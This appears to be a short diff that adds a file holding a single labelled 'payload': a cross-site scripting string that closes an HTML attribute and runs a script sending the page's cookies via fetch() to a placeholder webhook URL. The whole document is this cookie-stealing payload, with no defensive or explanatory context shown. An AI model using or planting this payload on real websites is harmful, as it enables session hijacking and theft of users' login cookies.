@@ -1,0 +1,4 @@
+payload:
+
+```"><script>fetch('<webhookurl>?c='+document.cookie)</script>
+```
